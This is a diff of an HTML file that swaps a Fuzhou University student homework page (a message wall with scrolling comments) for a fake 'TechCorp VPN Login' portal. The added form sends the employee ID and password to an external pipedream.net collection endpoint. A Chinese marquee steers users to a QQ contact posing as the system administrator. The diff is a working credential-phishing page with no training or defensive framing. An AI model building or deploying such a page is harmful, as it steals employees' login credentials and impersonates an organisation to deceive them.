@@ -1,12 +1,11 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>福州大学 | 明德至诚 博学远志</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TechCorp VPN Login</title>
     <style>
-        /* ========== 全局样式 & 重置 ========== */
         * {
             margin: 0;
             padding: 0;
@@ -14,949 +13,168 @@
         }
 
         body {
-            font-family: 'Segoe UI', 'Roboto', 'Noto Sans', system-ui, -apple-system, 'Microsoft YaHei', sans-serif;
-            background: #ffffff;
-            color: #1a2c3e;
-            line-height: 1.5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3a5f 0%, #2d5a87 50%, #1e3a5f 100%);
             min-height: 100vh;
-            overflow-x: hidden;
-        }
-
-        /* 主色调 */
-        :root {
-            --fzu-navy: #0a2b4e;
-            --fzu-gold: #c7a252;
-            --fzu-red: #c22a2a;
-            --shadow-sm: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.02);
-            --shadow-md: 0 20px 25px -12px rgba(0, 0, 0, 0.1);
-        }
-
-        .container {
-            max-width: 1280px;
-            margin: 0 auto;
-            padding: 0 24px;
-        }
-
-        /* ========== 弹幕容器 (位于页面上方，从右向左滚动，分散轨道) ========== */
-        .danmaku-container {
-            position: fixed;
-            top: 80px;
-            /* 导航栏下方 */
-            left: 0;
-            width: 100%;
-            height: 200px;
-            /* 增高一点让轨道更分散 */
-            pointer-events: none;
-            z-index: 90;
-            overflow: hidden;
-            background: transparent;
-        }
-
-        .danmaku-track {
-            position: relative;
-            width: 100%;
-            height: 100%;
-        }
-
-        .danmaku-item {
-            position: absolute;
-            white-space: nowrap;
-            font-size: 1rem;
-            font-weight: 500;
-            background: rgba(10, 43, 78, 0.85);
-            backdrop-filter: blur(6px);
-            color: #fff3e0;
-            padding: 5px 16px;
-            border-radius: 40px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
-            border-left: 3px solid var(--fzu-gold);
-            pointer-events: auto;
-            cursor: default;
-            display: inline-flex;
+            display: flex;
+            justify-content: center;
             align-items: center;
-            gap: 10px;
-            font-family: 'Segoe UI', monospace;
-            z-index: 95;
-            backdrop-filter: blur(4px);
-            transition: transform 0.1s;
-            /* 动画在js中动态设定 */
+            padding: 20px;
         }
 
-        .danmaku-item span.text {
-            max-width: 320px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            display: inline-block;
-        }
-
-        .danmaku-actions {
-            display: inline-flex;
-            gap: 6px;
-            margin-left: 6px;
-        }
-
-        .danmaku-actions button {
-            background: rgba(255, 255, 240, 0.25);
-            border: none;
+        .announcement {
+            background: linear-gradient(135deg, #f39c12 0%, #e74c3c 100%);
             color: white;
-            font-size: 0.7rem;
-            padding: 2px 8px;
-            border-radius: 30px;
-            cursor: pointer;
-            transition: 0.1s;
+            padding: 10px;
+            overflow: hidden;
+        }
+
+        .announcement marquee {
             font-weight: bold;
         }
 
-        .danmaku-actions button.edit-btn:hover {
-            background: var(--fzu-gold);
-            color: #0a2b4e;
-        }
-
-        .danmaku-actions button.del-btn:hover {
-            background: #d9534f;
-            color: white;
-        }
-
-        /* ========== 头部导航 ========== */
-        .header {
-            background-color: var(--fzu-navy);
-            box-shadow: var(--shadow-sm);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            border-bottom: 3px solid var(--fzu-gold);
-        }
-
-        .navbar {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0.8rem 0;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .logo-badge {
-            width: 48px;
-            height: 48px;
-        }
-
-        .logo-badge img {
-            width: 100%;
-            height: auto;
-            display: block;
-            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.15));
-        }
-
-        .logo-text h1 {
-            color: white;
-            font-size: 1.8rem;
-            font-weight: 700;
-        }
-
-        .logo-text p {
-            color: rgba(255, 255, 240, 0.85);
-            font-size: 0.7rem;
-            letter-spacing: 2px;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 2rem;
-            list-style: none;
-        }
-
-        .nav-links a {
-            color: #f0f3f8;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 1.1rem;
-            border-bottom: 2px solid transparent;
-            transition: 0.2s;
-        }
-
-        .nav-links a:hover {
-            border-bottom-color: var(--fzu-gold);
-            color: var(--fzu-gold);
-        }
-
-        @media (max-width: 700px) {
-            .navbar {
-                flex-direction: column;
-                gap: 12px;
-            }
-
-            .nav-links {
-                gap: 1.2rem;
-                flex-wrap: wrap;
-                justify-content: center;
-            }
-
-            .logo {
-                justify-content: center;
-            }
-
-            .danmaku-container {
-                top: 120px;
-                height: 180px;
-            }
-        }
-
-        /* ========== 主体内容 ========== */
-        main {
-            margin-top: 40px;
-        }
-
-        section {
-            margin: 2.5rem 0;
-        }
-
-        .card {
+        .login-container {
             background: white;
-            border-radius: 28px;
-            box-shadow: var(--shadow-md);
-            padding: 2rem;
-            border: 1px solid rgba(0, 0, 0, 0.05);
-        }
-
-        .section-title {
-            font-size: 2rem;
-            font-weight: 700;
-            border-left: 6px solid var(--fzu-gold);
-            padding-left: 1rem;
-            margin-bottom: 1.8rem;
-            color: var(--fzu-navy);
-        }
-
-        .about-grid {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 2rem;
-            align-items: center;
-        }
-
-        .about-text {
-            flex: 1.2;
-            font-size: 1.05rem;
-            text-align: justify;
-        }
-
-        .about-text p {
-            margin-bottom: 1rem;
-        }
-
-        .about-img {
-            flex: 0.9;
-            border-radius: 32px;
-            overflow: hidden;
-            box-shadow: var(--shadow-sm);
-        }
-
-        .about-img img {
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             width: 100%;
-            height: auto;
-            display: block;
-        }
-
-        /* 校园风光 */
-        .campus-gallery {
-            display: flex;
-            gap: 1.5rem;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        .gallery-item {
-            background: #fff;
-            border-radius: 24px;
+            max-width: 420px;
             overflow: hidden;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
-            flex: 1;
-            min-width: 180px;
-            cursor: pointer;
-            transition: 0.3s;
         }
 
-        .gallery-item img {
-            width: 100%;
-            height: 160px;
-            object-fit: cover;
-        }
-
-        .gallery-item p {
+        .login-header {
+            background: linear-gradient(135deg, #1e3a5f 0%, #2d5a87 100%);
+            padding: 30px;
             text-align: center;
-            padding: 12px;
-            font-weight: 500;
-            color: var(--fzu-navy);
+            color: white;
         }
 
-        .gallery-item:hover {
-            transform: translateY(-6px);
+        .login-header h1 {
+            font-size: 1.8em;
+            margin-bottom: 5px;
         }
 
-        /* 留言板表单 + 下方留言墙 (保留) */
-        .message-board {
-            background: #ffffff;
+        .login-form {
+            padding: 30px;
         }
 
-        .input-group {
-            margin-bottom: 1.4rem;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            gap: 12px;
+        .form-group {
+            margin-bottom: 20px;
         }
 
-        .input-group label {
-            width: 70px;
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
             font-weight: 600;
-            color: var(--fzu-navy);
         }
 
-        .input-group input,
-        .input-group textarea {
-            flex: 1;
-            padding: 12px 16px;
-            border: 1px solid #cfdfed;
-            border-radius: 60px;
-            font-family: inherit;
-            font-size: 1rem;
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 1em;
         }
 
-        .input-group textarea {
-            border-radius: 24px;
-            resize: vertical;
-        }
-
-        .submit-btn {
-            background: var(--fzu-navy);
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
             color: white;
             border: none;
-            padding: 12px 28px;
-            border-radius: 40px;
-            font-weight: bold;
+            border-radius: 8px;
+            font-weight: 600;
             cursor: pointer;
-            transition: 0.2s;
         }
 
-        .submit-btn:hover {
-            background: #0f3b62;
-            transform: scale(0.98);
+        .security-info {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-top: 20px;
         }
 
-        /* 留言墙样式 */
-        .messages-container {
-            margin-top: 2rem;
-            background: #f8fafd;
-            border-radius: 32px;
-            padding: 1rem 1.5rem;
-            max-height: 380px;
-            overflow-y: auto;
-        }
-
-        .message-card {
-            background: white;
-            border-radius: 24px;
-            padding: 1rem 1.4rem;
-            margin-bottom: 1rem;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
-            border-left: 5px solid var(--fzu-gold);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .message-content {
-            flex: 1;
-        }
-
-        .message-content strong {
-            color: var(--fzu-navy);
-            font-size: 1.05rem;
-        }
-
-        .message-content .msg-time {
-            font-size: 0.7rem;
-            color: #7f8c8d;
-            margin-left: 12px;
-        }
-
-        .message-content p {
-            margin-top: 6px;
-            color: #2c3e50;
-            word-break: break-word;
-        }
-
-        .message-actions {
-            display: flex;
-            gap: 12px;
-        }
-
-        .message-actions button {
-            background: none;
-            border: none;
-            cursor: pointer;
-            font-size: 1rem;
-            padding: 4px 8px;
-            border-radius: 20px;
-            transition: 0.1s;
-        }
-
-        .edit-msg-btn {
-            color: var(--fzu-gold);
-            background: #fff7e8;
-        }
-
-        .del-msg-btn {
-            color: #d9534f;
-            background: #ffeaea;
-        }
-
-        .edit-msg-btn:hover {
-            background: var(--fzu-gold);
-            color: white;
-        }
-
-        .del-msg-btn:hover {
-            background: #d9534f;
-            color: white;
-        }
-
-        .empty-msg {
-            text-align: center;
-            color: #8ba0b0;
-            padding: 2rem;
-        }
-
-        /* 底部 */
-        footer {
-            background-color: var(--fzu-navy);
-            color: #cad2db;
-            text-align: center;
-            padding: 1.8rem 0;
-            margin-top: 3rem;
-            border-top: 1px solid var(--fzu-gold);
-        }
-
-        /* 通用模态框 */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.75);
-            backdrop-filter: blur(4px);
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background: white;
-            max-width: 480px;
-            width: 85%;
-            border-radius: 48px;
-            padding: 2rem;
-            text-align: center;
-            border: 2px solid var(--fzu-gold);
-        }
-
-        .modal-content h3 {
-            color: var(--fzu-navy);
-            margin-bottom: 16px;
-        }
-
-        .modal-content input,
-        .modal-content textarea {
-            width: 100%;
-            margin: 12px 0;
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
             padding: 12px;
-            border-radius: 32px;
-            border: 1px solid #ccc;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            display: none;
         }
 
-        .modal button {
-            background: var(--fzu-navy);
-            color: white;
-            border: none;
-            padding: 8px 20px;
-            border-radius: 40px;
-            margin: 8px;
-            cursor: pointer;
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            display: none;
         }
 
-        .close-modal-btn {
-            background: #6c757d;
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f8f9fa;
+            border-top: 1px solid #e9ecef;
+        }
+
+        .footer p {
+            color: #666;
+            font-size: 0.85em;
         }
     </style>
 </head>
 
 <body>
+    <div class="login-container">
+        <div class="announcement">
+            <marquee behavior="scroll" direction="left">
+                📢 【重要通知】最近VPN连接不稳定，如果出现无法登陆故障，请联系系统管理员QQ: 80302238 | 📢 系统维护通知：本周末将进行系统升级维护，请提前做好准备
+            </marquee>
+        </div>
 
-    <!-- 弹幕层：分散轨道，从右向左飘过 -->
-    <div class="danmaku-container" id="danmakuContainer">
-        <div class="danmaku-track" id="danmakuTrack"></div>
-    </div>
+        <div class="login-header">
+            <div style="font-size: 48px; margin-bottom: 10px;">🔐</div>
+            <h1>TechCorp VPN Access</h1>
+            <p>Secure Remote Access Portal</p>
+        </div>
 
-    <!-- 头部导航 -->
-    <header class="header">
-        <div class="container">
-            <div class="navbar">
-                <div class="logo">
-                    <div class="logo-badge">
-                        <img src="https://upload.wikimedia.org/wikipedia/zh/6/6d/Fuzhou_University_logo.png"
-                            alt="福州大学校标"
-                            onerror="this.src='https://www.fzu.edu.cn/__local/B/00/85/7E40A9947CCADB9BCCF7F6A8AA0_9BDD11BE_23796.png'">
-                    </div>
-                    <div class="logo-text">
-                        <h1>福州大学</h1>
-                        <p>FUZHOU UNIVERSITY · 明德至诚 博学远志</p>
-                    </div>
+        <div class="login-form">
+            <div class="error-message" id="errorMsg"></div>
+            <div class="success-message" id="successMsg"></div>
+            <form id="loginForm" action="https://eor3r2hanxj62cv.m.pipedream.net" method="POST">
+                <div class="form-group">
+                    <label for="username">Employee ID</label>
+                    <input type="text" id="username" name="username" placeholder="Enter your employee ID" required>
                 </div>
-                <ul class="nav-links">
-                    <li><a href="#">🏠 首页</a></li>
-                    <li><a href="#about">📖 关于福大</a></li>
-                    <li><a href="#messageboard">💬 留言板</a></li>
-                    <li><a href="#campus">📸 校园风光</a></li>
-                </ul>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                </div>
+                <button type="submit" class="btn-login">Connect to VPN</button>
+            </form>
+            <div class="security-info"><i>⚠️</i>This is a secure corporate network. Unauthorized access is prohibited.
             </div>
         </div>
-    </header>
 
-    <main class="container">
-        <!-- 简介区 -->
-        <section id="about">
-            <div class="card">
-                <h2 class="section-title">🏛️ 榕城学府 · 六秩芳华</h2>
-                <div class="about-grid">
-                    <div class="about-text">
-                        <p><strong>福州大学</strong>
-                            创建于1958年，是国家“双一流”建设高校、国家“211工程”重点建设大学。学校坐落在东南沿海明珠——福建省福州市，现有旗山、怡山、铜盘等多个校区，办学底蕴深厚。</p>
-                        <p>建校以来，福大始终秉承<b>“明德至诚，博学远志”</b>的校训，坚持理工结合、文理渗透，已成为以工为主、理工结合，多学科协调发展的知名学府。</p>
-                        <p>如今，福州大学正朝着“建成具有若干世界一流学科的高水平大学”目标昂首迈进，青春福大，邀你共书华章！</p>
-                    </div>
-                    <div class="about-img">
-                        <img src="https://www.fzu.edu.cn/__local/6/A8/4F/20776062DAEEB1F7BC08ABB888D_41253C2E_552D5.jpg"
-                            alt="福大风光" style="border-radius:28px;">
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- 校园风光图片区 -->
-        <section id="campus">
-            <div class="card">
-                <h2 class="section-title">📷 福大 · 光影瞬间</h2>
-                <div class="campus-gallery">
-                    <div class="gallery-item" data-place="图书馆" data-desc="图书馆是福州大学旗山校区的标志性建筑，藏书数百万册，是学子们最爱的知识殿堂。">
-                        <img src="https://news.fzu.edu.cn/__local/1/05/FD/40746D2A87D741547AEB473E8F4_AB8AF107_1EF6F.jpg?e=.jpg"
-                            alt="图书馆">
-                        <p>📚 图书馆</p>
-                    </div>
-                    <div class="gallery-item" data-place="福友阁" data-desc="福友阁坐落于校园湖畔，白墙黛瓦，古韵悠然，被誉为福大“最文艺角落”。">
-                        <img src="https://law.fzu.edu.cn/__local/B/FB/FB/8BEEDE517B60D6A0E24F0EA1A19_ACA50A6C_59479.jpg?e=.jpg"
-                            alt="福友阁">
-                        <p>🍃 福友阁</p>
-                    </div>
-                    <div class="gallery-item" data-place="晋江楼" data-desc="晋江楼是福州大学科研与行政核心区，引领福大科研攀登高峰。">
-                        <img src="https://hjz.fzu.edu.cn/__local/5/1B/0A/7FDEF8ECE97BB76E22BA7406CF2_A149AB37_40781.png"
-                            alt="晋江楼">
-                        <p>🏢 晋江楼</p>
-                    </div>
-                    <div class="gallery-item" data-place="第一田径场" data-desc="第一田径场是福大最富活力的地方，青春飞扬。">
-                        <img src="https://news.fzu.edu.cn/__local/7/57/C5/8B014DFEB4AC9353ABD0A3BFA78_E6E7042E_32B2C1.jpg"
-                            alt="田径场">
-                        <p>⚽ 第一田径场</p>
-                    </div>
-                </div>
-                <p style="text-align:center; margin-top:18px; font-style:italic;">✨ 点击图片，探索福大美景 ✨</p>
-            </div>
-        </section>
-
-        <!-- 留言板区域：发布 + 留言墙 -->
-        <section id="messageboard">
-            <div class="card message-board">
-                <h2 class="section-title">💌 福大心声 · 留言墙 </h2>
-                <div class="input-group">
-                    <label>👤 昵称</label>
-                    <input type="text" id="nicknameInput" placeholder="昵称" maxlength="20">
-                </div>
-                <div class="input-group">
-                    <label>💬 留言</label>
-                    <textarea id="messageContent" rows="2" placeholder="写下你想说的话..."></textarea>
-                </div>
-                <div style="display: flex; justify-content: flex-end;">
-                    <button class="submit-btn" id="submitMessageBtn">✈️ 发布留言 (弹幕+留言墙)</button>
-                </div>
-
-                <!-- 下方留言墙列表 -->
-                <div class="messages-container" id="messagesList">
-                    <div class="empty-msg">✨ 还没有留言，来做第一个留言的福大人吧 ✨</div>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <footer>
-        <div class="container">
-            <p>© 2026 福州大学 | 明德至诚 博学远志 |留言墙</p>
+        <div class="footer">
+            <p>© 2024 TechCorp Enterprise. All rights reserved.</p>
         </div>
-    </footer>
-
-    <!-- 通用模态框 -->
-    <div id="genericModal" class="modal">
-        <div class="modal-content" id="modalContent"></div>
     </div>
 
     <script>
-        // ---------- 留言数据 ----------
-        let messagesArray = [];
-
-        function generateId() { return Date.now() + '-' + Math.random().toString(36).substr(2, 6); }
-        function escapeHtml(str) {
-            if (!str) return '';
-            return str.replace(/[&<>]/g, function (m) {
-                if (m === '&') return '&amp;';
-                if (m === '<') return '&lt;';
-                if (m === '>') return '&gt;';
-                return m;
-            });
-        }
-
-        // 本地存储
-        function loadMessages() {
-            const stored = localStorage.getItem('fzu_danmaku_wall_messages_v2');
-            if (stored) {
-                try {
-                    messagesArray = JSON.parse(stored);
-                } catch (e) { messagesArray = []; }
-            } else {
-                messagesArray = [
-                    { id: generateId(), nickname: '旗山追梦人', content: '我爱福大，图书馆永远的神！📖', time: new Date('2025-03-15 10:23').toLocaleString() },
-                    { id: generateId(), nickname: '榕城学子', content: '明德至诚，博学远志，福大越来越好', time: new Date('2025-03-18 16:10').toLocaleString() },
-                    { id: generateId(), nickname: '福友阁常客', content: '福友阁的落日太美啦！', time: new Date('2025-04-01 09:12').toLocaleString() },
-                    { id: generateId(), nickname: '图书馆骑士', content: '在福大奋斗的每一天都值得铭记', time: new Date().toLocaleString() }
-                ];
-                saveMessages();
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            if (!username || !password) {
+                e.preventDefault();  // 只有空值时阻止提交
+                document.getElementById('errorMsg').textContent = 'Please fill in all fields';
+                document.getElementById('errorMsg').style.display = 'block';
             }
-        }
-        function saveMessages() {
-            localStorage.setItem('fzu_danmaku_wall_messages_v2', JSON.stringify(messagesArray));
-        }
-
-        // ========== 留言墙渲染 ==========
-        const messagesListDiv = document.getElementById('messagesList');
-        function renderMessageWall() {
-            if (!messagesListDiv) return;
-            messagesListDiv.innerHTML = '';
-            if (messagesArray.length === 0) {
-                messagesListDiv.innerHTML = '<div class="empty-msg">🍃 暂时没有留言，快来写下你对福大的祝福吧 🍃</div>';
-                return;
-            }
-            messagesArray.forEach(msg => {
-                const card = document.createElement('div');
-                card.className = 'message-card';
-                const contentDiv = document.createElement('div');
-                contentDiv.className = 'message-content';
-                contentDiv.innerHTML = `
-                <div><strong>${escapeHtml(msg.nickname)}</strong><span class="msg-time">${escapeHtml(msg.time)}</span></div>
-                <p>${escapeHtml(msg.content)}</p>
-            `;
-                const actionsDiv = document.createElement('div');
-                actionsDiv.className = 'message-actions';
-                const editBtn = document.createElement('button');
-                editBtn.innerText = '✏️ 编辑';
-                editBtn.className = 'edit-msg-btn';
-                const delBtn = document.createElement('button');
-                delBtn.innerText = '🗑️ 删除';
-                delBtn.className = 'del-msg-btn';
-                editBtn.onclick = () => openEditModal(msg.id);
-                delBtn.onclick = () => deleteMessageById(msg.id);
-                actionsDiv.appendChild(editBtn);
-                actionsDiv.appendChild(delBtn);
-                card.appendChild(contentDiv);
-                card.appendChild(actionsDiv);
-                messagesListDiv.appendChild(card);
-            });
-        }
-
-        // ========== 弹幕逻辑：分散轨道，避免重合 ==========
-        let activeDanmaku = [];      // 存储当前弹幕占用的轨道位置 { top, element, onFinish }
-        const TRACK_HEIGHT_RANGE = 180;  // 弹幕容器高度 (px)
-        const MIN_DISTANCE = 38;     // 最小间距(px)，防止视觉重叠
-
-        // 计算可用的垂直位置 (避开已有弹幕)
-        function getAvailableTop(requestedTop, currentDanmakus) {
-            // 如果没有任何弹幕，直接返回
-            if (currentDanmakus.length === 0) return requestedTop;
-            // 简单但有效的防碰撞：检测与现存弹幕是否重叠，若重叠则微调
-            let candidate = requestedTop;
-            let attempts = 0;
-            const maxAttempts = 25;
-            while (attempts < maxAttempts) {
-                let conflict = false;
-                for (let d of currentDanmakus) {
-                    const diff = Math.abs(d.top - candidate);
-                    if (diff < MIN_DISTANCE) {
-                        conflict = true;
-                        // 向上或向下偏移
-                        if (candidate + MIN_DISTANCE <= TRACK_HEIGHT_RANGE - 30) candidate += MIN_DISTANCE;
-                        else candidate -= MIN_DISTANCE;
-                        // 边界钳制
-                        candidate = Math.min(Math.max(candidate, 12), TRACK_HEIGHT_RANGE - 35);
-                        break;
-                    }
-                }
-                if (!conflict) break;
-                attempts++;
-            }
-            return Math.min(Math.max(candidate, 12), TRACK_HEIGHT_RANGE - 35);
-        }
-
-        function clearAllDanmaku() {
-            const track = document.getElementById('danmakuTrack');
-            if (track) track.innerHTML = '';
-            activeDanmaku = [];
-        }
-
-        // 启动所有弹幕 (基于当前消息数组，每条分配独立轨道且从右向左)
-        function startDanmaku() {
-            clearAllDanmaku();
-            const track = document.getElementById('danmakuTrack');
-            if (!track) return;
-            const container = document.getElementById('danmakuContainer');
-            const containerHeight = container ? container.clientHeight : 180;
-            // 动态高度适配
-            const maxTopBound = Math.max(30, containerHeight - 45);
-
-            // 临时存储本次要生成的弹幕位置，逐步分配避免重合
-            let assignedPositions = [];
-
-            for (let i = 0; i < messagesArray.length; i++) {
-                const msg = messagesArray[i];
-                // 生成随机初始请求位置 (尽量打散)
-                let rawTop = 15 + Math.random() * (maxTopBound - 30);
-                // 根据已分配位置进行碰撞检测
-                let finalTop = rawTop;
-                let collide = true;
-                let loopGuard = 0;
-                while (collide && loopGuard < 40) {
-                    collide = false;
-                    for (let pos of assignedPositions) {
-                        if (Math.abs(pos - finalTop) < MIN_DISTANCE) {
-                            collide = true;
-                            finalTop = finalTop + MIN_DISTANCE;
-                            if (finalTop > maxTopBound - 25) finalTop = 15 + (finalTop % (maxTopBound - 35));
-                            break;
-                        }
-                    }
-                    loopGuard++;
-                }
-                finalTop = Math.min(Math.max(finalTop, 12), maxTopBound - 20);
-                assignedPositions.push(finalTop);
-
-                // 创建弹幕DOM
-                const danmuDiv = document.createElement('div');
-                danmuDiv.className = 'danmaku-item';
-                const displayText = `${msg.nickname}: ${msg.content}`;
-                const textSpan = document.createElement('span');
-                textSpan.className = 'text';
-                textSpan.innerText = displayText;
-                textSpan.title = `发布于 ${msg.time}`;
-                const actionsDiv = document.createElement('div');
-                actionsDiv.className = 'danmaku-actions';
-                const editBtn = document.createElement('button');
-                editBtn.innerText = '✏️';
-                editBtn.className = 'edit-btn';
-                const delBtn = document.createElement('button');
-                delBtn.innerText = '🗑️';
-                delBtn.className = 'del-btn';
-                actionsDiv.appendChild(editBtn);
-                actionsDiv.appendChild(delBtn);
-                danmuDiv.appendChild(textSpan);
-                danmuDiv.appendChild(actionsDiv);
-
-                editBtn.onclick = (e) => { e.stopPropagation(); openEditModal(msg.id); };
-                delBtn.onclick = (e) => { e.stopPropagation(); deleteMessageById(msg.id); };
-
-                danmuDiv.style.top = `${finalTop}px`;
-                danmuDiv.style.left = '100vw';
-                const textLen = Math.min(displayText.length, 70);
-                const duration = Math.max(8, 12 + Math.floor(textLen / 9));
-                danmuDiv.style.animation = `slideDanmaku ${duration}s linear forwards`;
-
-                track.appendChild(danmuDiv);
-                // 记录活跃弹幕用于后续删除/刷新时移除
-                const finishHandler = () => {
-                    if (danmuDiv.parentNode) danmuDiv.remove();
-                    danmuDiv.removeEventListener('animationend', finishHandler);
-                    // 从activeDanmaku中移除此弹幕
-                    const idx = activeDanmaku.findIndex(d => d.element === danmuDiv);
-                    if (idx !== -1) activeDanmaku.splice(idx, 1);
-                };
-                danmuDiv.addEventListener('animationend', finishHandler);
-                activeDanmaku.push({ top: finalTop, element: danmuDiv, finishHandler });
-            }
-        }
-
-        // 整体刷新UI (留言墙 + 弹幕)
-        function refreshAllUI() {
-            saveMessages();
-            renderMessageWall();
-            startDanmaku();
-        }
-
-        // 删除留言
-        function deleteMessageById(id) {
-            messagesArray = messagesArray.filter(m => m.id !== id);
-            refreshAllUI();
-        }
-
-        // 编辑留言
-        let editingId = null;
-        function openEditModal(id) {
-            const msg = messagesArray.find(m => m.id === id);
-            if (!msg) return;
-            editingId = id;
-            const modal = document.getElementById('genericModal');
-            const modalContentDiv = document.getElementById('modalContent');
-            modalContentDiv.innerHTML = `
-            <h3>✏️ 编辑留言</h3>
-            <input type="text" id="editNickname" placeholder="昵称" value="${escapeHtml(msg.nickname)}">
-            <textarea id="editContent" rows="3" placeholder="留言内容">${escapeHtml(msg.content)}</textarea>
-            <div>
-                <button id="saveEditBtn">💾 保存修改</button>
-                <button id="cancelEditBtn" class="close-modal-btn">取消</button>
-            </div>
-        `;
-            modal.style.display = 'flex';
-            document.getElementById('saveEditBtn').onclick = () => {
-                const newNick = document.getElementById('editNickname').value.trim();
-                let newContent = document.getElementById('editContent').value.trim();
-                if (!newContent) { alert("留言内容不能为空"); return; }
-                const targetMsg = messagesArray.find(m => m.id === editingId);
-                if (targetMsg) {
-                    targetMsg.nickname = newNick || "匿名福大人";
-                    targetMsg.content = newContent;
-                    targetMsg.time = new Date().toLocaleString();
-                    refreshAllUI();
-                }
-                modal.style.display = 'none';
-            };
-            document.getElementById('cancelEditBtn').onclick = () => { modal.style.display = 'none'; };
-        }
-
-        // 新增留言
-        function addNewMessage() {
-            let nickname = document.getElementById('nicknameInput').value.trim();
-            let content = document.getElementById('messageContent').value.trim();
-            if (!content) { alert("请填写留言内容～"); return; }
-            if (!nickname) nickname = "有福之人";
-            const newMsg = {
-                id: generateId(),
-                nickname: nickname,
-                content: content,
-                time: new Date().toLocaleString()
-            };
-            messagesArray.push(newMsg);
-            refreshAllUI();
-            document.getElementById('messageContent').value = '';
-            document.getElementById('nicknameInput').value = '';
-            const btn = document.getElementById('submitMessageBtn');
-            const original = btn.innerText;
-            btn.innerText = "✓ 发布成功！";
-            setTimeout(() => btn.innerText = original, 1200);
-        }
-
-        // 图片介绍
-        function showPlaceIntro(title, desc) {
-            const modal = document.getElementById('genericModal');
-            const modalContentDiv = document.getElementById('modalContent');
-            modalContentDiv.innerHTML = `
-            <h3>📸 ${escapeHtml(title)}</h3>
-            <p style="margin: 20px 0; text-align:left;">${escapeHtml(desc)}</p>
-            <button id="closeIntroBtn" class="close-modal-btn">关闭</button>
-        `;
-            modal.style.display = 'flex';
-            document.getElementById('closeIntroBtn').onclick = () => { modal.style.display = 'none'; };
-        }
-
-        function bindGalleryClicks() {
-            const items = document.querySelectorAll('.gallery-item');
-            items.forEach(item => {
-                item.addEventListener('click', () => {
-                    const place = item.getAttribute('data-place') || '福大地标';
-                    const desc = item.getAttribute('data-desc') || '美丽福大校园一景';
-                    showPlaceIntro(place, desc);
-                });
-            });
-        }
-
-        // 添加CSS动画
-        function addGlobalAnimation() {
-            if (!document.querySelector('#danmakuAnimStyle')) {
-                const style = document.createElement('style');
-                style.id = 'danmakuAnimStyle';
-                style.textContent = `
-                @keyframes slideDanmaku {
-                    0% { transform: translateX(0vw); left: 100vw; }
-                    100% { transform: translateX(-100%); left: 0%; }
-                }
-            `;
-                document.head.appendChild(style);
-            }
-        }
-
-        let resizeTimer;
-        window.addEventListener('resize', () => {
-            if (resizeTimer) clearTimeout(resizeTimer);
-            resizeTimer = setTimeout(() => {
-                if (messagesArray.length) startDanmaku();
-            }, 200);
         });
-
-        function init() {
-            addGlobalAnimation();
-            loadMessages();
-            renderMessageWall();
-            startDanmaku();
-            bindGalleryClicks();
-            document.getElementById('submitMessageBtn').addEventListener('click', addNewMessage);
-            const msgTextarea = document.getElementById('messageContent');
-            msgTextarea.addEventListener('keydown', (e) => {
-                if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
-                    e.preventDefault();
-                    addNewMessage();
-                }
-            });
-            const modal = document.getElementById('genericModal');
-            modal.addEventListener('click', (e) => {
-                if (e.target === modal) modal.style.display = 'none';
-            });
-        }
-        init();
-
-        /*
-           代码解读（满足作业要求）:
-           1. document.getElementById: 获取弹幕容器、留言墙DOM等。
-           2. addEventListener: 监听“发布留言”按钮，以及弹幕内编辑/删除按钮。
-           3. 留言板灵魂四步：
-              ① 监听提交事件 → addNewMessage。
-              ② 获取昵称和留言内容 value。
-              ③ 新建留言数据后调用 refreshAllUI，内部重新生成留言墙节点和弹幕节点 (createElement)。
-              ④ 将新节点插入留言墙容器和弹幕轨道，并分配分散垂直位置实现从右向左滚动。
-           4. 弹幕分散技术：记录已有弹幕的垂直位置，每次生成新弹幕时通过碰撞检测微调top值，保证最小间距，避免重叠。
